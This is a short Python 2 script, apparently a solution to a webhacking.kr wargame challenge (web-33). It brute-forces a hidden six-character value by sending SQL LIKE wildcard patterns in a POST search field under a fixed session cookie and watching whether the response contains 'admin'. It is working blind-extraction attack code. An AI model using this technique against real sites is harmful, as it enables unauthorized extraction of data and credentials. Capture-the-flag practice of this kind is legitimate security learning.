import urllib
import httplib
import hashlib

pw=""
for i in range(1,7):
    for c in range(ord("a"),ord("z")+1)+range(ord("0"),ord("9")+1)+range(33,128):
        HTTP=httplib.HTTPConnection("webhacking.kr")
        Param="search="+str("_"*(i-1))+chr(c)+str("_"*(6-i))
        Headers={"Content-Type":"application/x-www-form-urlencoded",
                 "Cookie":"PHPSESSID=bc4730b877a0174a3eef0f693c329912;"}
        HTTP.request("POST","/challenge/web/web-33/",Param,Headers)
        Result=HTTP.getresponse().read()
        if "<td>admin</td>" in Result:
            pw+=chr(c)
            print "find: "+pw
            break
        else:
            print "nope: "+Param

# content is "kk.php"
